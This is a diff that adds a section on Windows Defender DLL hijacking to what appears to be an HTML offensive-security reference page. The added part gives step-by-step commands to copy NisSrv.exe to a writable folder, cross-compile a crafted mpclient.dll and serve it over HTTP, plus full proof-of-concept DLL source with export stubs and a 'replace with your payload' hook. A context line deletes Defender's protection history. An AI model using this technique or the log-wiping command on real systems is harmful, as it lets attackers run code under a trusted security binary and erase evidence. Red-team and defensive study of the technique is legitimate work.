@@ -714,3 +714,59 @@ Get-MpThreatDetection | Select-Object ThreatID, InitialDetectionTime, Resources,
 
 # Clear the protection history log (useful for testing — requires admin):
 Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*" -Recurse -Force</code></pre>
+
+<h2>Windows Defender DLL Hijacking (NisSrv.exe)</h2>
+<p>Windows Defender's Network Inspection Service (<code>NisSrv.exe</code>) loads <code>mpclient.dll</code> from its own directory. By copying <code>NisSrv.exe</code> to a user-writable directory and placing a crafted <code>mpclient.dll</code> alongside it, you can execute arbitrary code under the service's context.</p>
+
+<h3>Attack Steps</h3>
+<pre><code># Step 1: Copy NisSrv.exe to a writable location
+copy "%ProgramFiles%\Windows Defender\NisSrv.exe" "C:\Users\Public\DLL Hijacking\"
+
+# Step 2: Compile the malicious mpclient.dll (Linux cross-compile)
+sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 wine64
+x86_64-w64-mingw32-g++ --shared -o mpclient.dll mpclient.cpp
+
+# Step 3: Place mpclient.dll in the same directory as NisSrv.exe
+# Step 4: Run NisSrv.exe — it loads mpclient.dll from the current directory
+
+# Serve the DLL via HTTP if needed
+python3 -m http.server 80</code></pre>
+
+<h3>mpclient.dll Source (PoC)</h3>
+<pre><code>// mpclient.cpp — exports the functions NisSrv.exe expects
+#include &lt;windows.h&gt;
+#pragma comment(lib, "User32.lib")
+
+int Main() {
+    // Replace with your payload
+    MessageBoxW(0, L"DLL HIJACKING", L"DLL Hijacked", 0);
+    return 1;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        break;
+    }
+    return TRUE;
+}
+
+// Export stubs for expected functions
+extern "C" __declspec(dllexport) void MpConfigClose(){}
+extern "C" __declspec(dllexport) void MpConfigGetValueAlloc(){}
+extern "C" __declspec(dllexport) void MpHandleClose(){}
+extern "C" __declspec(dllexport) void MpNotificationRegister(){}
+extern "C" __declspec(dllexport) void MpManagerOpen(){}
+extern "C" __declspec(dllexport) void MpFreeMemory(){}
+extern "C" __declspec(dllexport) void MpConfigUninitialize(){}
+extern "C" __declspec(dllexport) void MpConfigOpen(){}
+extern "C" __declspec(dllexport) void MpConfigInitialize(){}
+extern "C" __declspec(dllexport) void MpClientUtilExportFunctions(){}
+extern "C" __declspec(dllexport) void MpUtilsExportFunctions(){ Main(); }</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>Windows Defender DLL Hijacking PoC — <code>github.com/2XXE-SRA/Windows-Defender-DLL-Hijacking</code></li>
+  <li>DLL Hijacking — HackTricks — <code>book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</code></li>
+  <li>Microsoft Defender Exclusions — <code>learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/</code></li>
+</ul>
